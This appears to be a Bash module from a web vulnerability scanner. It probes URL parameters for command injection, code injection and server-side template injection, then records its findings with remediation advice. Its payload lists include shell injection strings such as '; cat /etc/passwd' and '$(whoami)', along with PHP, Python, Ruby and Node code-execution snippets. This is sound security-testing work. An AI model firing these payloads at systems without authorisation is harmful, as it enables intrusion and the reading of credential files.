#!/bin/bash

# RCE (Remote Code Execution) Testing Module
# Tests for command injection and code execution vulnerabilities

source "$(dirname "${BASH_SOURCE[0]}")/../../core/logger.sh"
source "$(dirname "${BASH_SOURCE[0]}")/../../core/database.sh"

# Main RCE testing function
test_rce() {
    local url=$1
    local project_id=$2

    log_info "Testing RCE vulnerabilities on $url"

    # Test command injection
    test_command_injection "$url" "$project_id"

    # Test code injection (PHP, Python, etc.)
    test_code_injection "$url" "$project_id"
}

# Test command injection
test_command_injection() {
    local url=$1
    local project_id=$2

    log_info "[RCE] Testing Command Injection"

    # Command injection payloads
    local payloads=(
        # Time-based detection (sleep/ping)
        "; sleep 5"
        "| sleep 5"
        "\`sleep 5\`"
        "\$(sleep 5)"
        "& ping -c 5 127.0.0.1 &"
        # Output-based detection
        "; whoami"
        "| whoami"
        "\`whoami\`"
        "\$(whoami)"
        "; id"
        "| id"
        "; cat /etc/passwd"
        "| cat /etc/passwd"
        # Windows
        "& whoami &"
        "| whoami"
        "& type C:\\Windows\\System32\\drivers\\etc\\hosts"
        # Concatenation
        "&& whoami"
        "|| whoami"
        # Newline injection
        "%0a whoami"
        "%0d%0a whoami"
    )

    # Extract parameters
    local params=$(extract_url_parameters "$url")

    if [ -z "$params" ]; then
        # Test common parameter names
        local common_params=("cmd" "command" "exec" "execute" "ping" "host" "ip" "url")
        for param in "${common_params[@]}"; do
            test_rce_parameter "$url" "$param" "$project_id" "${payloads[@]}"
        done
    else
        while read -r param; do
            test_rce_parameter "$url" "$param" "$project_id" "${payloads[@]}"
        done <<< "$params"
    fi
}

# Test RCE on specific parameter
test_rce_parameter() {
    local url=$1
    local param=$2
    local project_id=$3
    shift 3
    local payloads=("$@")

    log_debug "[RCE] Testing parameter: $param"

    # Get baseline timing
    local start=$(date +%s%N 2>/dev/null || date +%s)
    curl -s -L --max-time 10 "$url" > /dev/null 2>&1
    local end=$(date +%s%N 2>/dev/null || date +%s)
    local baseline_time=$(( (end - start) / 1000000 ))  # Convert to ms
    [ -z "$baseline_time" ] && baseline_time=1000

    log_debug "[RCE] Baseline response time: ${baseline_time}ms"

    for payload in "${payloads[@]}"; do
        # Build test URL
        local test_url=$(build_test_url "$url" "$param" "$payload")

        # Time-based detection for sleep payloads
        if echo "$payload" | grep -qE "sleep|ping"; then
            local start=$(date +%s)
            local response=$(curl -s -L --max-time 15 "$test_url" 2>/dev/null)
            local end=$(date +%s)
            local response_time=$((end - start))

            # Calculate expected time (5 second delay + baseline)
            local baseline_secs=$((baseline_time / 1000))
            [ $baseline_secs -lt 1 ] && baseline_secs=1
            local expected_time=$((baseline_secs + 5))

            # Only report if response time is significantly longer than baseline
            # AND close to expected delay (within 2 seconds)
            local time_diff=$((response_time - expected_time))
            [ $time_diff -lt 0 ] && time_diff=$((-time_diff))

            if [ $response_time -ge 5 ] && [ $time_diff -le 2 ]; then
                log_critical "[RCE] Time-based command injection found in parameter '$param'!"

                db_add_finding "$project_id" "critical" "rce_command_injection" \
                    "Remote Code Execution - Command Injection" \
                    "URL: $test_url\nParameter: $param\nPayload: $payload\n\nBaseline time: ${baseline_secs}s\nResponse time: ${response_time}s\nExpected (with sleep 5): ${expected_time}s\n\nThe application executes system commands with unsanitized user input, allowing arbitrary command execution." \
                    "" "10.0" \
                    "CRITICAL - IMMEDIATE ACTION REQUIRED:\n1. Never pass user input to system commands\n2. Use language-specific APIs instead of shell commands\n3. If shell commands are necessary, use strict whitelist validation\n4. Escape all special shell characters\n5. Run application with minimum privileges\n6. Use security controls like AppArmor/SELinux"

                save_rce_evidence "$project_id" "$test_url" "$payload" "Time-based: ${response_time}s (baseline: ${baseline_secs}s)"
                return 0
            fi
        fi

        # Output-based detection
        local response=$(curl -s -L --max-time 10 "$test_url" 2>/dev/null)

        # Check for command output
        if echo "$response" | grep -qE "root:|uid=|gid=|groups=|www-data|apache|nginx"; then
            log_critical "[RCE] Command injection with output found in parameter '$param'!"

            db_add_finding "$project_id" "critical" "rce_command_injection_output" \
                "Remote Code Execution - Command Injection with Output" \
                "URL: $test_url\nParameter: $param\nPayload: $payload\n\nCommand output detected in response:\n$(echo "$response" | grep -E "root:|uid=|gid=" | head -5)\n\nThe application executes system commands and returns output to the user." \
                "" "10.0" \
                "CRITICAL - IMMEDIATE ACTION REQUIRED:\n1. Remove all system command execution\n2. Use native language APIs\n3. If unavoidable, implement strict whitelist\n4. Never display command output to users\n5. Run with minimum privileges\n6. Implement logging and monitoring"

            save_rce_evidence "$project_id" "$test_url" "$payload" "$response"
            return 0
        fi

        # Check for file contents (passwd, hosts)
        if echo "$response" | grep -qE "127.0.0.1.*localhost|root:x:|administrator"; then
            log_critical "[RCE] File disclosure via command injection in parameter '$param'!"

            db_add_finding "$project_id" "critical" "rce_file_disclosure" \
                "Remote Code Execution - File Disclosure" \
                "URL: $test_url\nParameter: $param\nPayload: $payload\n\nSensitive file contents detected in response.\n\nThis confirms command injection vulnerability allowing file reading." \
                "" "9.8" \
                "CRITICAL - IMMEDIATE ACTION REQUIRED:\n1. Remove system command execution\n2. Implement proper input validation\n3. Use whitelisting approach\n4. Apply principle of least privilege"

            save_rce_evidence "$project_id" "$test_url" "$payload" "$response"
            return 0
        fi
    done

    return 1
}

# Test code injection (PHP, Python, Ruby, etc.)
test_code_injection() {
    local url=$1
    local project_id=$2

    log_info "[RCE] Testing Code Injection"

    # Code injection payloads
    local payloads=(
        # PHP
        "<?php system('whoami'); ?>"
        "<?php echo shell_exec('id'); ?>"
        "<?php phpinfo(); ?>"
        "<?=\`id\`?>"
        # Python
        "__import__('os').system('whoami')"
        "exec('import os; os.system(\"id\")')"
        # Ruby
        "\#{%x(whoami)}"
        # Expression Language (Java/JSP)
        "\${7*7}"
        "\${{7*7}}"
        # Server-Side Template Injection
        "{{7*7}}"
        "{{config}}"
        "{{4*4}}[[5*5]]"
        # Node.js
        "require('child_process').exec('whoami')"
    )

    local params=$(extract_url_parameters "$url")

    if [ -z "$params" ]; then
        local common_params=("code" "eval" "execute" "template" "expr" "expression")
        for param in "${common_params[@]}"; do
            test_code_injection_param "$url" "$param" "$project_id" "${payloads[@]}"
        done
    else
        while read -r param; do
            test_code_injection_param "$url" "$param" "$project_id" "${payloads[@]}"
        done <<< "$params"
    fi
}

# Test code injection on parameter
test_code_injection_param() {
    local url=$1
    local param=$2
    local project_id=$3
    shift 3
    local payloads=("$@")

    for payload in "${payloads[@]}"; do
        local test_url=$(build_test_url "$url" "$param" "$payload")
        local response=$(curl -s -L --max-time 10 "$test_url" 2>/dev/null)

        # Check for code execution indicators
        if echo "$response" | grep -qE "uid=|root:|www-data|phpinfo\(\)|PHP Version"; then
            log_critical "[RCE] Code injection found in parameter '$param'!"

            db_add_finding "$project_id" "critical" "rce_code_injection" \
                "Remote Code Execution - Code Injection" \
                "URL: $test_url\nParameter: $param\nPayload: $payload\n\nCode execution detected. The application evaluates user input as code." \
                "" "10.0" \
                "CRITICAL:\n1. Never use eval() or similar functions with user input\n2. Avoid dynamic code execution\n3. Use safe alternatives (JSON parsing, etc.)\n4. Implement strict input validation\n5. Run with minimum privileges"

            save_rce_evidence "$project_id" "$test_url" "$payload" "$response"
            return 0
        fi

        # Check for template injection
        if echo "$payload" | grep -qE "{{7\*7}}|{{\$7\*7}}" && echo "$response" | grep -q "49"; then
            log_critical "[RCE] Server-Side Template Injection found in parameter '$param'!"

            db_add_finding "$project_id" "critical" "rce_ssti" \
                "Remote Code Execution - Server-Side Template Injection" \
                "URL: $test_url\nParameter: $param\nPayload: $payload\n\nTemplate injection detected (7*7=49 in response)." \
                "" "9.8" \
                "CRITICAL:\n1. Never pass user input directly to template engines\n2. Use sandboxed template environments\n3. Implement strict content escaping\n4. Validate and sanitize all inputs"

            save_rce_evidence "$project_id" "$test_url" "$payload" "$response"
            return 0
        fi
    done

    return 1
}

# Helper functions
build_test_url() {
    local url=$1
    local param=$2
    local value=$3

    local encoded_value=$(urlencode "$value")

    if [[ "$url" == *"?"* ]]; then
        if [[ "$url" == *"$param="* ]]; then
            echo "$url" | sed "s/\([?&]${param}=\)[^&]*/\1${encoded_value}/"
        else
            echo "${url}&${param}=${encoded_value}"
        fi
    else
        echo "${url}?${param}=${encoded_value}"
    fi
}

extract_url_parameters() {
    local url=$1
    [[ "$url" != *"?"* ]] && return 1
    echo "${url#*\?}" | tr '&' '\n' | cut -d= -f1
}

urlencode() {
    local string="$1"
    local strlen=${#string}
    local encoded=""
    local pos c o

    for (( pos=0 ; pos<strlen ; pos++ )); do
        c=${string:$pos:1}
        case "$c" in
            [-_.~a-zA-Z0-9] ) o="${c}" ;;
            * ) printf -v o '%%%02x' "'$c"
        esac
        encoded+="${o}"
    done
    echo "$encoded"
}

save_rce_evidence() {
    local project_id=$1
    local url=$2
    local payload=$3
    local response=$4

    local evidence_dir="data/projects/${project_id}/evidence/rce"
    mkdir -p "$evidence_dir"

    local timestamp=$(date +%Y%m%d_%H%M%S)
    cat > "${evidence_dir}/rce_${timestamp}.txt" <<EOF
RCE Evidence
URL: $url
Payload: $payload
Captured: $(date)

Response:
$response
EOF
    log_debug "[RCE] Evidence saved"
}

export -f test_rce
export -f test_command_injection
export -f test_code_injection
export -f test_rce_parameter
export -f test_code_injection_param
export -f build_test_url
export -f extract_url_parameters
export -f urlencode
export -f save_rce_evidence
